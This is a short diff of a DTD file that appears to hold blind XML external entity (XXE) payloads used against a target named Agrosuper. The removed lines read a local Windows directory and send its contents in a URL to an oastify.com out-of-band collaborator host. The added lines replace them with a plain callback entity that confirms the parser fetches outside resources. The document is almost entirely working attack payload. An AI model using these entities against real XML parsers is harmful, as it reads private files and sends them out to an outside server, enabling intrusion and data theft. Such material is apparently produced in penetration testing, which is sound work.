@@ -1,4 +1,2 @@
-<!ENTITY % file SYSTEM "file:///e:/Servicios/02.Agrosuper/">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://tur1gwp2xx0ui86fl5qa28040v6oulia.oastify.com/agrosuper-root?data=%file;'>">
-%eval;
-%exfil;
+<!ENTITY % test SYSTEM "http://confirmacion-dns.oogwarjxrsupc30af0k5w3uzuq0johc6.oastify.com/">
+%test;
